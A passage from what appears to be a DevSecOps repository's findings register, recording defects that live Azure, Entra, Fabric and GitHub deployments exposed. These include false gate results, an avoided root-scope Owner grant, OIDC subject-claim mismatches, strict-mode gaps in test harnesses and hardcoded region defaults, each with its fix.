**Where.** `.github/dependabot.yml` sets `labels:` on all twelve ecosystem entries,
naming fourteen distinct labels — `dependencies`, `npm`, `docker`, `python`,
`github-actions`, the seven per-app names, `vuln-lab` and `do-not-auto-bump`. **None of
them existed.** The repository carried only GitHub's ten default labels. Dependabot
cannot create labels, so for every pull request it posted:

```
### Labels
The following labels could not be found: `dependencies`, `do-not-auto-bump`, `vuln-lab`.
Please create them before Dependabot can add them to a pull request.
```

and applied none of them. Forty-two pull requests, forty-two comments, forty-two
notifications — every one avoidable, and every one making the channel that reports real
dependency risk slightly less worth reading. The `docker` entries added on 2026-08-29
(finding [F38](#f38)) inherited the same defect on the day they were written.

**This is the shape [F30](#f30) and the L09 playbook's "failure mode 5" warn about**, one
notch less severe: a Dependabot configuration that is syntactically valid, is accepted,
does something, and does not do the thing it declares. The file's own header opens by
warning that "wrong directory globs or an ecosystem typo means no alerts ever fire". The
globs and ecosystems were right. Nobody checked the labels.

**Fix.** All fourteen labels created, with descriptions and a colour scheme that separates
ecosystem from app from the two warning labels. `dependabot.yml`'s header now states the
prerequisite in the place someone adding a fifteenth label will read it, with the
`gh label create` line.

**No test guards this, deliberately.** Every suite in this repository is offline and
mocked, and asserting a repository's label set requires the live GitHub API. A test that
needs network access to pass is a test that fails for the wrong reason; the prerequisite is
documented at the point of use instead. The honest position is that this one is guarded by
a comment, not a gate.


## F46

**Nine defects surfaced by the first real tenant, three of them wrong results inside the gate that is supposed to catch wrong results**

- **Severity:** high (one false PASS in the G0 gate; two false FAILs, one of which pointed at an $18/user purchase that was neither needed nor available)
- **Confidence:** CONFIRMED — every item observed against a live Azure/Entra/Fabric tenant on 2026-08-29, not inferred
- **Controls:** 3.12.3 (monitor security controls on an ongoing basis), 3.14.1 (flaw remediation)
- **Closed by:** the tenant bring-up itself
- **Status:** CLOSED

**Found while:** running G0 for real for the first time. Every one of these had survived
1,352 Pester assertions, 63 of them written specifically against the bootstrap scripts,
because all 63 mock the cloud. This is [F22](#f22)'s lesson at the next level up: it is
not enough to run your code, you have to run it *against the thing it talks to*.

### The three that were wrong inside the gate

**1. `Licenses` — a false FAIL that told you to spend money (high).** The check demanded
two SKU part numbers: one of `SPE_E5`/`ENTERPRISEPREMIUM`, **plus** a separate
`EMSPREMIUM`. Microsoft 365 E5 *contains* the Enterprise Mobility + Security capabilities
as service plans; a tenant on it has no `EMSPREMIUM` SKU and never will. So the gate
failed a tenant holding every capability the estate uses, and its remediation text pointed
at a licence costing **$18/user/month**. It is also **no longer purchasable as a trial** —
the Microsoft 365 admin center now lists EMS E3 and E5 for purchase only — so an adopter
following the runbook could not have satisfied the old check without paying. Now asserts
`AAD_PREMIUM_P2`, `RMS_S_PREMIUM` and `MFA_PREMIUM` from whatever SKU provides them.

**2. `FabricCapacity` — a false PASS, which is worse (high).** It accepted any capacity in
state `Active`. Signing into Fabric for the first time on an M365 E5 tenant provisions
**"Premium Per User - Reserved", SKU `PP3`**, from the bundled Power BI Pro licence. It is
Active. It is a capacity. It **cannot host a lakehouse**. The gate reported the tenant
ready and L5 would have been where you found out. Now requires an F-series SKU and names
what it found.

The SKU string took **three attempts and a live tenant to establish**, which is the part
worth keeping: a first guess of `FT1`, asserted from memory; then Microsoft's own trial
documentation, which says in prose *"an F4 capacity (4 capacity units) or an F64
capacity"*; then a regex written from that documentation, `^F(T)?\d+$`, which **still
rejects the real value**. The Power BI admin API returns **`FTL4`**. The documented
capacity *size* and the API's SKU *string* are different things, and no amount of reading
would have settled it.

**3. `FabricSpAccess` — a check that did not exist because [F43](#f43) asserted it could
not (high).** F43, written the previous day, said C4 was portal work "with no read path
this script can use under your login." Untrue: the Fabric admin API returns every tenant
setting at `GET /v1/admin/tenantsettings`. Writing the check took twenty minutes and
immediately caught a live misconfiguration — **C4 is five settings, not one**, the runbook
named a sixth that no longer exists ("Service principals can use Fabric APIs"), and the
one L5 depends on (`ServicePrincipalAccessGlobalAPIs`, workspace creation) was **off**
while the confusingly-similar `ServicePrincipalAccessPermissionAPIs` was on. G0 would have
gone green; `New-FabricWorkspace` would have failed at L5.

### The six in the path around it

**4. Resource providers unregistered.** A fresh subscription has `Microsoft.App`, `Sql`,
`KeyVault`, `Storage`, `OperationalInsights`, `Insights`, `Web` and `Fabric` all
`NotRegistered`, and **nothing in this repository registers them** — no script, no
workflow, no runbook line. ARM fails partway through a layer with
`MissingSubscriptionRegistration`.

**5. A personal Microsoft account cannot administer the tenant it creates.** The default
path from Azure's own signup page gives a "Default Directory" in which you are an external
identity (`you_hotmail.com#EXT#@tenant.onmicrosoft.com`). That account is **refused by
`admin.microsoft.com` outright**, so it cannot buy the licences C2 requires. A cloud-only
admin must be created first.

**6. Global Administrator carries no Azure RBAC.** The new cloud admin could not read a
resource group, and — the part that costs a round trip — **cannot grant itself Owner**,
because that needs `Microsoft.Authorization/roleAssignments/write` it does not have. The
grant has to come from the original personal account. C1 said "confirm Global
Administrator" as though that settled access; directory roles and Azure RBAC are separate
axes and the runbook never said so.

**7. Git Bash silently corrupts `--scope`.** MSYS rewrites a leading-slash argument into a
Windows path, so `--scope /subscriptions/...` arrives as
`C:/Program Files/Git/subscriptions/...` and the CLI answers **`MissingSubscription`** — an
error naming your subscription when the fault is your shell. It cost a diagnosis cycle
even knowing the machine was Windows. The repo's own scripts are PowerShell and immune;
this bites the copy-paste commands *in the runbook*.

**8. `usageLocation` blocks every licence assignment.** Assigning E5 to the new admin fails
with *"License assignment cannot be done for user with invalid usage location"*. The repo
already knew this for the demo personas — `apply-entra.ps1` sets `usageLocation` and the
runbook calls it "a prerequisite for licensing" — but nobody anticipated that the *admin*
account needs it too, because the runbook assumed an account that already had one.

**9. The admin-consent URL the bootstrap script prints cannot work.** `01-root-oidc.ps1`
ended by printing a `/adminconsent` link per app. That endpoint redirects to a reply
address after approval, and both apps are daemon identities with **no redirect URI** — nor
should they have one. The result is `AADSTS500113: No reply address is registered for the
application`, on the very last step of the very first script.
`az ad app permission admin-consent --id <appId>` grants the same consent through Graph
with no redirect at all; the script now prints that first and keeps the URL below it with
the error attached.

### The Fabric trial trap, recorded because it is close to irreversible

Not a repository defect, but it cost an account. The Fabric Account manager offers **"Power
BI only"** and **"Fabric and Power BI"**. Taking the first gives an individual PPU trial
and no capacity; **cancelling it burns that user's trial eligibility permanently** — the
Account manager then shows only "Buy now", and Microsoft's documented workaround (trigger
a trial by creating a Fabric item) shows "Buy now" too. The recovery is a **second user**,
because eligibility is per-user while the tenant setting stays enabled. The alternative was
a paid F2 at ~$0.36/hr under gate G2.

### What this says about the method

Every finding in this register before F46 was found by reading, by CI, or by a gate. These
were found by **doing the thing once**. The three gate defects are the ones that matter:
`verify-g0.ps1` is the artifact whose entire job is to refuse a tenant that is not ready,
and on first contact with a real tenant it got three answers wrong — including one that
would have waved through a subscription that could not deploy L5.

The register's standing lesson has been *"a gate should be assumed inert until its first
failure proves otherwise"* ([F39](#f39)). F46 sharpens it: **a gate should be assumed wrong
until it has run against production reality, however green its mocks are.** Sixty-three
passing tests against a mocked `az` proved only that the script's control flow works.


---

## F47

**L2 asked for Owner at the tenant root, and the layer never needed it**

- **Severity:** high (the documented remedy was a standing root-scope Owner service principal, plus a Global Administrator elevation step for every adopter)
- **Confidence:** CONFIRMED - observed in workflow run 33264310126 against the live tenant, then read back out of that run's own log
- **Controls:** 3.1.2 (limit access to permitted transactions and functions), 3.1.5 (least privilege)
- **Closed by:** retargeting the deployment; no grant was made
- **Status:** CLOSED

**Found while:** running `scripts/up.ps1 -DryRun` for the first time against a real
subscription. `L2 landing zone` failed:

```
AuthorizationFailed: The client '***' with object id '8c7d66f3-...' does not have
authorization to perform action 'Microsoft.Resources/deployments/whatIf/action' over
scope '/providers/Microsoft.Management/managementGroups/c3571944-...'
```

`infra/bicep/landing-zone/main.bicep` is `targetScope = 'managementGroup'` and
`layer-02-landing-zone.yml` deployed it with `--management-group-id "${AZURE_TENANT_ID}"`
- the **tenant root**, where `mls-github-deployer` held nothing. `docs/runbooks/layers/L02.md`
had predicted exactly this as failure mode 1 and prescribed the remedy: *"this is a G0 gap
- the human re-runs the relevant `01-root-oidc.ps1` grant step (elevated tenant-root
access is a human-only action)."* Neither `01-root-oidc.ps1` nor `docs/runbooks/g0-bootstrap.md`
contains any such step, or mentions management groups at all. So the runbook named the
failure, named a remedy, and pointed at a bootstrap step that does not exist.

**The remedy was also wrong.** Azure's one-time *elevate access* toggle plus
`Management Group Contributor` at the root is the obvious reading, and it does not even
work: that role's action list is management-group operations and `Microsoft.Authorization/*/read`
- no `Microsoft.Resources/deployments/*`, so the deployment still fails. Making it work
means **Owner at `/`**, permanently, for a CI service principal, in a repository whose
purpose is to demonstrate least privilege. Every stranger cloning this would have needed
Global Administrator and a tenant-wide elevation to run L2.

### What the run log actually showed

Reading the failed job rather than reasoning about it:

```
Management group mls already exists.
"id": "/providers/Microsoft.Management/managementGroups/mls/subscriptions/a8f2925d-..."
```

The deployer had **already created the management group and already placed the
subscription** - the two operations that supposedly needed root - with zero tenant-root
RBAC. Azure permits any directory principal to create a management group beneath the root
by default, and makes the creator its Owner. That is where the deployer's
`Owner` on `/providers/Microsoft.Management/managementGroups/mls` came from; nothing in
`scripts/bootstrap/` grants it, which had been quietly puzzling.

And the template did not need root scope for anything else: every policy assignment in it
is already `scope: managementGroup(mgName)`. The only two root-scope declarations - the
AVM management-group module and the `managementGroups/subscriptions` placement - were
**redundant with the workflow steps that had already succeeded three steps earlier**.

**Fix:** deploy the template at MG `mls` instead of the root, and delete the two redundant
declarations (`infra/bicep/landing-zone/main.bicep`, `layer-02-landing-zone.yml`). No role
assignment was created, no elevation performed, and the toggle that had been opened in the
portal was closed unused. `infra/bicep/README.md` drops the AVM management-group module and
one raw resource (eight to seven); `docs/runbooks/layers/L02.md` failure mode 1 is rewritten
to describe the condition that can actually occur - a tenant with *Require write permissions
for creating new management groups* enabled - and to say explicitly that granting Owner at
`/` is a worse outcome than the outage.

### What this says about the method

F46's lesson was that a gate is wrong until it runs against production reality. F47 is the
same lesson pointed at a **runbook**: L02.md's failure mode 1 was written by reasoning
about what the layer would need, it named a real symptom, and both its diagnosis ("a G0
gap") and its remedy ("re-run the grant step") were wrong - the grant step did not exist
and the grant was not needed. A predicted failure mode that has never been observed is a
hypothesis, and this one had been sitting in the playbook being trusted.

The near miss is the part worth keeping: the documented path led to granting a CI service
principal Owner over every current and future subscription in the tenant. It would have
worked. The demo would have deployed. And the estate would have carried, permanently, the
exact standing privilege its own compliance register exists to catch - installed by
following its own runbook.


---

## F48

**The bootstrap constructed GitHub's OIDC subject claim instead of asking GitHub for it**

- **Severity:** high (the whole "no stored Azure credential" design rests on this one string matching; it fails closed, locking every workflow out of the subscription)
- **Confidence:** CONFIRMED - `AADSTS700213` observed on the first real federated login, fixed, and the same login observed green afterwards
- **Controls:** 3.5.1 (identify processes acting on behalf of users), 3.5.2 (authenticate those identities)
- **Closed by:** `Get-GitHubSubClaimPrefix` in `scripts/bootstrap/01-root-oidc.ps1`
- **Status:** CLOSED

**Found while:** the first OIDC login of the first real deployment run. Azure refused the
token:

```
AADSTS700213: No matching federated identity record found for presented assertion subject
'repo:paulcfuqua@51541817/azure-devsecops-demo@1347346268:environment:demo'
```

`01-root-oidc.ps1` registered exactly one federated credential per app, with a subject it
assembled itself: `"repo:${Repository}:environment:${EnvironmentName}"`. GitHub now embeds
**immutable actor identifiers** - the numeric owner id and repository id - in the subject
claim, so that renaming an organisation or a repository cannot silently redirect an
existing federated trust to whoever claims the freed-up name. The hand-built string is the
old shape, and it no longer matches.

**The flag that describes this behaviour was wrong about it.** GitHub reports the prefix it
will present at `GET /repos/{owner}/{repo}/actions/oidc/customization/sub`. That endpoint
returned `use_immutable_subject: false` on this repository **while GitHub was presenting
the immutable subject** - so code that branches on the boolean gets the wrong answer. The
`sub_claim_prefix` field in the same response is correct. Read the prefix; ignore the flag.

**Fix:** `Get-GitHubSubClaimPrefix` asks GitHub what subject it will present, and the script
registers **both** forms - classic and immutable - for the deployer and the verifier.
Registering both rather than replacing one with the other is deliberate: GitHub is evidently
mid-transition, and an app that accepts only the form GitHub happens to send today breaks
silently the day that changes. Neither subject widens the trust; both name the same
repository and the same environment, which is the property [F7](#f7) cares about. When `gh`
is unavailable or the field is absent the script registers the classic subject alone, which
is the previous behaviour.

**Follow-up, deferred then closed the same day.** `verify-g0.ps1`'s `Federation` check
asserted only that *a* credential carried `environment:demo`. It passed while this defect
was live and would have passed again, because it never asked GitHub which subject would
actually be presented. Held back at first - adding a G0 check hours before a live
deployment is how [F46](#f46)'s false FAILs happened - and done between runs instead. The
check now resolves `sub_claim_prefix` through the shared `MlsBootstrap.psm1` and requires a
credential for each form GitHub says it will send, falling back to the classic subject
alone where no immutable prefix is reported. Mutation-tested: restoring the old
classic-only assertion fails the new case and nothing else. Against the live tenant it now
reads *"environment subject present, both classic and immutable forms"*.

### What this says about the method

Same shape as [F46](#f46)'s Fabric SKU, and worth pairing with it: in both cases the code
**constructed a value that belongs to another system**, and in both cases the constructed
value was wrong in a way no amount of reading could have settled - the Fabric docs say `F4`
where the API says `FTL4`; GitHub's own flag says `false` where GitHub's own tokens say
otherwise. The authoritative value is the one the API returns. Ask, do not derive.

The failure mode is also worth noting for anyone debugging this: `AADSTS700213` names the
subject that was **presented** but not the ones that are **registered**, so the error tells
you half of a comparison. The fix is only obvious once you print the other half.


---

## F49

**The Verifier's test suite ran in a different language mode than the Verifier**

- **Severity:** high (the estate's sign-off gate died before evaluating a single criterion, and 535 passing tests reported nothing wrong)
- **Confidence:** CONFIRMED - observed twice in CI on `main`, reproduced locally, and the new guard mutation-tested
- **Controls:** 3.12.1 (periodically assess security controls), 3.12.3 (monitor security controls on an ongoing basis)
- **Closed by:** call-site wraps, the removal of every `Set-StrictMode -Off`, and a static call-site guard
- **Status:** CLOSED

**Found while:** looking at repository state after [F47](#f47) merged. Two `verify-l1` runs had
failed on `main` and nobody had opened them. The uploaded report was one line:

```
layer-01-audit could not start: The property 'Count' cannot be found on this object.
```

### The defect

`Get-AllowedGuid` ends `return @($allowed | Sort-Object -Unique)`. PowerShell unrolls an
array on return, and it does so in **two** ways that matter:

- zero elements emit **no output at all**, so the caller is assigned `$null`;
- one element unrolls to the **bare scalar**, so the caller is assigned a `String`.

Only two-or-more ever produced a countable collection. The preflight then read
`$allowedGuid.Count` under the `Set-StrictMode -Version Latest` the script sets at line 42,
where both shapes are a *terminating* error. Neither allowlist source exists on a fresh
estate - `guid-allowlist.txt` is not committed, and `reports/label-guids.json` is written by
L4 - so the audit crashed on the zero case, every time, on any estate that had not yet run
L4.

The same return shape sits in `Get-MlsCollection`, the helper **every** layer uses, and in
`Get-ManifestUserPrincipalName`. Thirteen call sites assigned one of them without
re-wrapping.

### Why 535 passing tests said nothing

Two independent reasons, and the second is the one worth keeping.

**1. The harnesses disabled the language mode being tested.** All twelve audit scripts set
`Set-StrictMode -Version Latest`. Thirteen test files set `Set-StrictMode -Off` - fourteen
occurrences - immediately after dot-sourcing the script that had just turned it on. Present
since the toolkit's first commit (`d65f4f9`), so it was never a fix for anything; it was
just how the file was written, thirteen times. The existing L1 tests were **already
executing the crashing line**. Deleting the `-Off` made ten of eleven fail instantly, at
`layer-01-audit.ps1:219`, with the CI error verbatim.

Someone had already half-noticed. A comment in `layer-03-audit.Tests.ps1` reads *"This whole
file runs Set-StrictMode -Off, so it would not otherwise notice that the audit itself runs
under -Version Latest... These two put strict mode back on for the call."* The mismatch was
understood well enough to be worked around for two tests, and never fixed for the suite.

**2. `Get-MlsCollection`'s tests supplied their own answer.** Every assertion re-wrapped the
call: `@(Get-MlsCollection -Response $Response).Count | Should -Be 0`. Re-wrapping `$null`
in `@()` produces exactly the empty array the assertion wanted, so the tests passed on the
broken function - while the nine production call sites, which do not re-wrap, got `$null`.
The wrapper *was* the test's answer. Same shape as [F42](#f42)'s hollow ReDoS test, where
`header.trim()` stripped the hostile input before the regex ever saw it.

### The fix that did not work, and why it is worth recording

The obvious repair is to push the wrap down into the helper: `return ,@(...)`, so the array
survives the return. It fixes every unwrapped caller and **breaks every wrapped one** -
`@(helper)` then yields a nested one-element array. Nine existing tests failed the moment it
was applied. There is no return shape that is correct for both caller styles, because `@()`
is idempotent for a real array but not for a returned one. `@()` **at the call site** is the
only form correct for zero, one and many. So this is a call-site invariant, not a helper
contract, and it needs a guard rather than a fix.

**Fix:** thirteen call sites wrapped (`layer-01-audit.ps1`, `layer-03-audit.ps1`); all
fourteen `Set-StrictMode -Off` removed, so the suite now runs in the mode CI runs in; a new
static guard in `MlsAudit.Tests.ps1` scans every audit source for an unwrapped assignment of
the three helpers and names the offending `file:line`. The guard was mutation-tested by
unwrapping `layer-03-audit.ps1:319` - it failed, naming that exact line, and passed again on
restore. Turning strict mode on also exposed two harness defects of its own: `$_.breakGlass`
read directly off manifest groups when only one of five carries the key (the production
audit uses `Get-MlsProperty`, and the test's own comment claimed it found the group "the
same way"), and `$script:DomainVariable` read in an `AfterAll` that had silently restored
nothing for months. 535 verification tests now pass under production strict mode.

### AMENDMENT, same day: the fix was half done

The change above removed `Set-StrictMode -Off` from `verification/tests/` and stopped there.
**Fourteen more harnesses outside that directory still disabled it** - `scripts/tests/`,
`scripts/bootstrap/tests/`, and every `infra/*/tests/` - against sixteen production scripts
that set `-Version Latest`. Removing those fourteen surfaced **41 failures**, four of them
genuine production defects that had been latent the entire time:

- **`verify-g0.ps1`'s catch block crashed the gate instead of recording a FAIL row.** It read
  `$check.Informational` on eleven hashtables where only one declares the key, so the handler
  that exists to turn a broken check into a reportable one was itself a terminating error. It
  had never fired only because no check had thrown yet.
- **`Get-FieldArray` in `apply-entra.ps1` did not return an array** - the function whose
  docstring is *"a field that is meant to be a list, as an array"*. An invalid manifest
  therefore reported `The property 'Count' cannot be found on this object` instead of naming
  the offending field.
- **`Test-FabricCapacity`** wrapped only the `Where-Object` half of a pipeline that then ran
  through `ForEach-Object`, so a tenant with exactly one non-Fabric capacity - a PP3, the
  precise case the check exists for - threw instead of reporting it.
- **`create-data-agent.ps1`** assigned an `if` expression whose branches each wrapped in
  `@()`; assignment unrolls the branch result, undoing the wrap. An unseeded lakehouse
  reported a type error instead of "seed the lakehouse (L5) before running L8".

That is one defect in **four syntactic disguises**: `return @()`, an `@()` around part of a
pipeline, an `if`-expression unrolled on assignment, and a property read on a hashtable
without the key. F49's static guard caught none of them, because it checks named helpers in
`verification/` and these are anonymous expressions elsewhere.

**The comma-operator dead end was re-derived and re-discarded.** `return ,@(...)` was tried
again on `Get-FieldArray`, broke nineteen tests again - the comma operator's whole purpose is
preventing enumeration, so callers that pipe the result bind `$_` to the entire array - and
was reverted to call-site wrapping again. The reasoning is now recorded in the function's own
comment, where the next person will be standing when they reach for it.

906 tests now pass with every harness in its script's own language mode.

### What this says about the method

[F46](#f46) established that a gate should be assumed wrong until it has run against
production reality. F49 adds the cheaper half of that: **a test that does not run in
production's configuration is not testing production**, and the difference can be one line
per file that nobody reads twice. The suite was not weak - 535 assertions, mutation-tested
guards elsewhere, hostile-input cases. It was thorough inside a language mode the Verifier
never runs in.

The compounding is the real lesson. The mode mismatch hid the class of bug; the re-wrapping
habit hid the specific one; and the audit that would have reported both is the audit that
crashed. A verifier that cannot start is indistinguishable, in a CI summary, from a verifier
that has nothing to say - and this one had failed twice on `main` before anyone opened it.


---

## F50

**A write permission that does not include read, and a gate that counted in prose**

- **Severity:** high (L3 cannot plan or apply; Conditional Access is the layer carrying V3.3's enforced-MFA evidence)
- **Confidence:** CONFIRMED - `403 AccessDenied` against the live tenant with the other five permissions consented, fixed, and G0 re-run green
- **Controls:** 3.1.2 (limit access to permitted transactions and functions), 3.5.2 (authenticate identities)
- **Closed by:** adding `Policy.Read.All` to the deployer's declared Graph roles
- **Status:** CLOSED

**Found while:** the first plan run that got far enough to reach L3 - which only happened
because [F47](#f47) unblocked L2. `apply-entra.ps1` planned five users, five groups and four
app registrations, then stopped:

```
Invoke-MgGraphRequest: infra/entra/apply-entra.ps1:106
GET https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies
HTTP/1.1 403 Forbidden
{"error":{"code":"AccessDenied","message":"You cannot perform the requested operation,
 required scopes are missing in the token."}}
```

All five declared Graph application permissions were consented - verified directly against
`servicePrincipals/{id}/appRoleAssignments`, and G0's `GraphConsent` check said so. The
deployer held **`Policy.ReadWrite.ConditionalAccess`**, the permission whose entire purpose
is Conditional Access, and was refused a **read** of Conditional Access.

For an *application* permission, `Policy.ReadWrite.ConditionalAccess` does not imply
`Policy.Read.All`. The name says otherwise and the shape of every other ReadWrite scope says
otherwise. The estate was therefore configured to let L3 **author** CA policies it was not
allowed to look at - and the plan died on the idempotency read every layer makes *before*
the write it did have rights for, which is why nothing in the layer's own design caught it.

`mls-verifier` had held `Policy.Read.All` since G0 was written, because reading CA state is
obviously a read. The deployer was never given it because writing CA state is obviously a
write.

**Fix:** `Policy.Read.All` added to `$script:DeployerGraphRoles` in
`scripts/bootstrap/01-root-oidc.ps1` and to `$script:GraphConsentedRoles` in
`verify-g0.ps1`. Deliberately **not** `Policy.ReadWrite.All`: closing a read gap must not
widen write scope, and a test now asserts that specific permission is absent. Granted and
admin-consented on the live tenant; the deployer now holds six app roles.

### The second defect, which is the one that will recur

`verify-g0.ps1` reported consent as the literal string `'all 5 application permissions
consented'` while asserting membership of a map. The number was prose. Add a sixth
permission and the gate keeps announcing five - correctly passing, and describing the wrong
estate. It now counts the map: `"all $($script:GraphConsentedRoles.Count) application
permissions consented"`.

The same duplication had spread into the tests. Two fixtures held their own hardcoded copy
of the role-id list, so adding one permission broke **six** unrelated assertions - a budget
test, three `EntraDiagnostics` tests, an idempotency test - none of which is about Graph
consent at all. Both fixtures now derive from the script's own map. Which roles are correct
is still pinned by explicit named assertions, where being wrong is the point; the fixture
only claims "the tenant consented whatever the script asks for."

### A third defect, found while fixing the second

Explaining the Fabric toggle to the sponsor surfaced one more false PASS, in a different
check. `FabricSpAccess` read each required setting's `enabled` flag - but a Fabric tenant
setting can be enabled **for specific security groups**, and the API reports `enabled: true`
either way. Scoping `ServicePrincipalAccessGlobalAPIs` to a group the deployer is not in
would therefore have produced a **green G0 and an L5 that fails at
`New-FabricWorkspace`** - the exact false-PASS shape [F46](#f46) caught in the capacity
check, in the check written to close it.

The check now reads `enabledSecurityGroups`, and where a required setting is scoped it
resolves the deployer's service principal and asks whether it is actually a member. An
unreadable answer counts as *not* a member: an unanswerable question fails the check rather
than passing it, because the cost of a false PASS here is a broken L5. Mutation-tested.

### What this says about the method

[F49](#f49) was a test suite that could not see a class of bug. F50 is smaller and more
ordinary: **a fact stated twice will eventually be stated differently**, and a count written
as prose beside the collection it counts is that pattern in its purest form. Three copies of
one list - the script's map, the gate's map, two test fixtures - and the only one anybody
would have read during an incident was the sentence that said five.

Worth pairing with [F48](#f48): both are the estate assuming it knows what another system
means. There, GitHub's subject format; here, Microsoft's scope semantics. In both cases the
authoritative answer was one API call away and the assumption was reasonable, well-named,
and wrong.


---

## F51

**The plan could never pass, so its exit code said nothing**

- **Severity:** medium (no wrong estate state; the pre-deploy gate simply could not report success)
- **Confidence:** CONFIRMED - every `up.ps1 -DryRun` run on 2026-08-29 failed this way
- **Controls:** - (operability)
- **Closed by:** a dry-run-only skip in `layer-07-apps.yml`
- **Status:** CLOSED

**Found while:** reading the third plan run of the day, the first in which every other layer
went green. L7 failed:

```
ResourceGroupNotFound: Resource group 'mls-rg-apps' could not be found.
```

L6 creates `mls-rg-apps`. In a plan run L6 only *what-ifs*, so the group does not exist, so
L7's own what-if has nothing to run against. That is the layering working as designed - but
the step failed on it unconditionally, which means **`up.ps1 -DryRun` could not exit 0 on
any estate that had not already been deployed**. The plan is the gate you run *before* the
first deploy; on a fresh estate, the one case it exists for, it always reported failure.

A gate that always fails is worth exactly as much as one that always passes. It had been
failing this way in every plan run today, and it read as noise each time precisely because
it was always there - including in the run where it sat beside the genuine L2 authorization
failure that turned out to be [F47](#f47).

**Fix:** the what-if step checks for the resource group first. Missing **and** `dry_run` is
a `::notice` and a clean exit; missing **without** `dry_run` still fails loudly, because
then L6 genuinely did not deliver what L7 depends on. The skip is scoped to the one
condition that makes it legitimate rather than tolerating a missing group in general.

### What this says about the method

The estate had three gates reporting on it today, and all three were broken in the same
direction: [F49](#f49)'s Verifier could not start, [F50](#f50)'s G0 counted in prose, and
this one could not succeed. None of the three was wrong about the estate - they were wrong
about *themselves*, and each was invisible for the same reason: **nobody reads a signal that
never changes.** A red L7 in every plan run is indistinguishable from wallpaper.


---

## F52

**Five defects the first real deployment exposed, and a plan that could not have caught any of them**

- **Severity:** high (the landing zone did not apply, and the platform layer built on it anyway)
- **Confidence:** CONFIRMED - all five observed in run 33272832687 against the live subscription
- **Controls:** 3.12.1 (assess controls), 3.12.3 (monitor controls on an ongoing basis)
- **Closed by:** four code fixes and one region decision
- **Status:** CLOSED

**Found while:** the first real `up.ps1`, immediately after three green `-DryRun` runs. This is
[F46](#f46) one level out: F46 was the first real *tenant* finding what mocks could not, and
this is the first real *deployment* finding what a plan could not.

### 1. A policy definition GUID that does not exist (high)

L2 failed two minutes in, inside four levels of nested ARM error, on:

```
PolicyDefinitionNotFound: The policy definition
'/providers/Microsoft.Authorization/policyDefinitions/e56962a6-4747-49cd-b67b-5fbf209ee700'
could not be found.
```

Checking all seven built-in ids the template pins, six resolve and one does not. The real
`Allowed locations` definition is `e56962a6-4747-49cd-b67b-`**`bf8b01975c4c`**. The pinned
value shares the first four segments and invents the last - the signature of a plausible
fabrication rather than a typo or upstream drift, which is what `docs/runbooks/layers/L02.md`
failure mode 3 had anticipated.

**`az deployment mg what-if` passed it three times.** What-if validates template shape and
computes a resource delta; it does not resolve policy definition ids. So the estate had a
green plan for a template that could never deploy. A preflight step now resolves all seven
before the deployment runs - seconds instead of two minutes, and it names the offender
instead of burying it in nested ARM JSON.

### 2. A skipped layer launders into a success (high)

Every downstream gate read:

```
!contains(fromJSON('["failure","cancelled"]'), needs.layer-0N.result)
```

`skipped` is in neither list. So L2 failed, L3 correctly skipped, **L4 saw `skipped` and
proceeded**, L4's job reported `success` because its own work had been skipped, and L5 and L6
took that as a green light. L6 created **thirteen real resources on a landing zone whose
governance policies had never applied** - no tag deny, no allowed-locations guardrail. The
demo's entire policy story was absent while the resources it governs were being built.

`skipped` cannot simply be added to the blocklist: it is also how selective replay works
(`layers: l6` legitimately skips L2-L5). The two cases are distinguished by whether the layer
was *selected*: `needs.plan.outputs.lN == 'true' && result == 'skipped'` means an upstream
died. Seven gates corrected.

The sponsor spotted this from the job list before the run finished, which is the part worth
recording: the failure was legible in the shape of the output and nobody had been reading it.

### 3. Azure SQL cannot provision in East US on this subscription (environmental)

```
ProvisioningDisabled: Provisioning is restricted in this region.
```

Not a defect in this repository - a trial-subscription capacity restriction. Querying
`Microsoft.Sql/locations/{region}/capabilities` per region turns it into a decision rather
than a guess: **eastus, eastus2, westus2, southcentralus, northeurope, westeurope and uksouth
are all `Visible`** (restricted); **centralus, westus3, westus and canadacentral are
`Available`**.

The estate moved to **Central US**: it satisfies Azure SQL, Flex Consumption Functions and
Container Apps, and it is the closest available region to the **East US** Fabric trial
capacity, which cannot move - Microsoft provisions it, and `docs/runbooks/g0-bootstrap.md`
already warned that its region is often not the tenant's.

### 4. An alert that cannot be created before the data it alerts on (medium)

The SQL failed-login rule queried `AzureDiagnostics | ... and succeeded_s == "false"`.
`AzureDiagnostics` has a dynamic schema: `succeeded_s` does not exist until SQL audit data has
been ingested, so ARM rejects the rule at create time with *"Failed to resolve column or
scalar expression named 'succeeded_s'"*. On a freshly rebuilt estate that is always. Now
`columnifexists("succeeded_s", "")`, which is the schema-tolerant form.

### 5. The Verifier was never handed an input that existed (medium)

L5's audit died at argument binding - *"Missing an argument for parameter
'FabricCapacityId'"* - on an estate where `FABRIC_CAPACITY_ID` had been set in the `demo`
environment since 16:05. The verify job's `env:` block simply never passed it. The step's own
notice text claims the audit is skipped when the variable is absent, which made the omission
read as configuration rather than a defect.

### What this says about the method

The plan was green. It had been green three times, and each green run increased confidence in
a template that could not deploy. **A plan is a model of a deployment, and this one did not
model the two things that actually failed** - whether a referenced definition exists, and what
happens to layer N+1 when layer N does not run.

The register's arc is now four steps of the same lesson at widening scope: mocks are not the
cloud ([F46](#f46)), a test is not production configuration ([F49](#f49)), a gate that never
fails is untested ([F51](#f51)), and now **a plan is not a deployment**. Each was found the
same way - by running the real thing once - and each had survived every check that came before
it.


---

## F53

**Setting the region did nothing, because sixteen hardcoded defaults outvoted it**

- **Severity:** high (the deploy silently targeted a region where Azure SQL cannot provision, immediately after that region was changed to fix exactly that)
- **Confidence:** CONFIRMED - caught in flight; run 33275398487 was cancelled mid-deploy
- **Controls:** 3.4.1 (baseline configuration), 3.4.2 (enforce configuration settings)
- **Closed by:** removing every region literal from the deploy path, plus a mutation-tested guard
- **Status:** CLOSED

**Found while:** the sponsor asked, immediately after the region change, *"Did we hardcode the
zones? should that also be in the github environment variables?"* The answer was yes and yes,
and the deploy acting on the new region was already running.

`vars.AZURE_LOCATION` had just been set to `centralus`. `scripts/up.ps1` declared
`[string]$Location = 'eastus'` and passes that value as a **workflow input** - and an input
always beats the environment variable a layer would otherwise read. Every one of the eight
layer workflows also carried `default: eastus`, fifteen occurrences in all. So the estate's
region had sixteen sources and the environment variable was not one of them: the run
dispatched thirty seconds after `AZURE_LOCATION=centralus` was set went to **East US**, the
region [F52](#f52) had just established cannot provision Azure SQL on this subscription.

It was cancelled with L2 already succeeded - which means the allowed-locations policy had been
assigned with `eastus`, so the estate's own guardrail would then have denied the Central US
deploy it was about to attempt. A misconfiguration that arranges for the correct
configuration to be rejected.

